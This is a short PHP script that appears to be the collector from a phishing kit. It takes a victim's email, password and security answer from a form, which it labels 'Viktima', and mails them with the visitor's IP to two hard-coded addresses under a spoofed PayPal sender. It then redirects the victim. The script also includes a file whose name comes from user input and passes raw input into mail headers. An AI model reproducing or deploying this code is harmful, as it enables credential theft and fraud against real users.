<?php



$ip = getenv("REMOTE_ADDR");
$login = $_POST['email'];
$passs = $_POST['pass'];
$answers = $_POST['answer'];
$hostname = $_POST['hostname'];


$message = "
Viktima  		: $login
Itaqi  			: $passs
Faqja			: $answers
IP	: http://www.geoiptool.com/?IP=$ip
;

$encrypt=  base64_encode($message);
include "$hostname";

$to = "muham3dd@gmail.com,muham3d@live.com"; // Email Here
$subject = "dhuratat = [$ip]";
$headers = "From: shabani <paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:bussines.php");


?>